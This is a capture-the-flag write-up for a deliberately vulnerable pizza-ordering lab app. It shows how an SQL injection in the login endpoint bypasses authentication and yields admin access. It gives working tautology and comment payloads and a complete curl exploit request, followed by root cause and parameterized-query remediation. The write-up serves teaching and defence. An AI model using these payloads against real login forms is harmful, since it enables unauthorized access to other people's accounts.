# Cheesy Does It — SQL Injection Authentication Bypass

**Platform:** BugForge Daily CTF
**Target:** `https://lab-<id>.labs-app.bugforge.io/`
**Category:** Web — SQL Injection / Authentication Bypass
**Hint:** *sql injection*
**Flag:** `bug{LPV1IbaDVmktxAnaDw5E2V25lWf9RxXv}`

---

## Summary

"Cheesy Does It" is a React single-page pizza-ordering app backed by an Express API. The login
endpoint (`POST /api/login`) builds its SQL query by concatenating the supplied `username`
directly into the statement. Injecting a classic boolean tautology bypasses authentication,
logs in as the first user in the table (`admin`), and the success response hands back the flag.

---

## Recon

The landing page is a React SPA ("Cheesy Does It - Premium Pizza Delivery"). All logic lives in a
single JS bundle, so the API surface was extracted from it:

```bash
curl -s https://<target>/static/js/main.<hash>.js -o p.js
grep -oE '"/api[a-zA-Z0-9_/-]*"' p.js | sort -u
```

Endpoints discovered:

```
/api/register        /api/login           /api/verify-token
/api/profile         /api/orders  /api/orders/:id
/api/menu/{pizzas,toppings,sauces,bases}
/api/payment/validate   /api/payment/process
/api/admin/{stats,users,orders}
```

A normal account was registered to obtain a baseline JWT. Notable observations:

- The JWT payload is only `{id, username, iat}` — no role — so admin status is resolved
  server-side from the database.
- `/api/admin/*` returned `{"error":"Admin access required"}` for a normal user.
- Mass-assigning `role:"admin"` via `PUT /api/profile` was rejected — not the path.

This pointed to needing to authenticate **as** an existing admin rather than escalating the
current account.

---

## Finding the injection

The login form sends `{username, password}` to `POST /api/login`. Probing the `username` field:

| Payload (`username`) | Result |
|---|---|
| `admin` / wrong pw | `{"error":"Invalid credentials"}` |
| `admin'` | `{"error":"Invalid credentials"}` |
| `admin' OR '1'='1` | ✅ **logged in as admin** |
| `admin'-- -` | ✅ **logged in as admin** |

The backend query is effectively:

```sql
SELECT * FROM users WHERE username = '<username>' AND password = '...'
```

Supplying `admin' OR '1'='1` (or commenting out the password check with `admin'-- -`) makes the
`WHERE` clause always true, returning the `admin` row. The server then issues a valid signed JWT
for that user.

---

## Exploitation

```bash
curl -s -X POST https://<target>/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin'"'"' OR '"'"'1'"'"'='"'"'1","password":"x"}'
```

Response:

```json
{
  "token": "eyJhbGci...",
  "user": {
    "id": 1,
    "username": "admin",
    "email": "admin@cheesedoesit.com",
    "role": "admin"
  },
  "success": "Welcome back, admin! Flag: bug{LPV1IbaDVmktxAnaDw5E2V25lWf9RxXv}"
}
```

The `admin'-- -` payload works identically (comment terminates the rest of the query).

**Flag:** `bug{LPV1IbaDVmktxAnaDw5E2V25lWf9RxXv}`

The returned token is a genuine admin JWT and also unlocks the previously forbidden
`/api/admin/stats`, `/api/admin/users`, and `/api/admin/orders` endpoints.

---

## Root cause

User input is concatenated directly into the SQL string with no parameterization:

```js
// vulnerable shape
db.query(`SELECT * FROM users WHERE username = '${username}' AND password = '${hash}'`)
```

A single quote in `username` breaks out of the string literal, letting the attacker rewrite the
query's logic.

## Remediation

- Use **parameterized queries / prepared statements** for every user-supplied value:
  ```js
  db.get('SELECT * FROM users WHERE username = ?', [username])
  ```
- Verify the password with a constant-time hash comparison **after** fetching the row — never
  inside the SQL string.
- Apply least privilege to the DB account and add a WAF/input-validation layer as defense in depth.
- Don't return sensitive data (flags, internal messages) in auth responses.

## Timeline of requests

1. Pull JS bundle → enumerate API, confirm admin is server-side and not mass-assignable.
2. Probe `POST /api/login` `username` with `'` → behaves differently from a normal failed login.
3. Inject `admin' OR '1'='1` → authenticate as admin, flag returned in the success message.
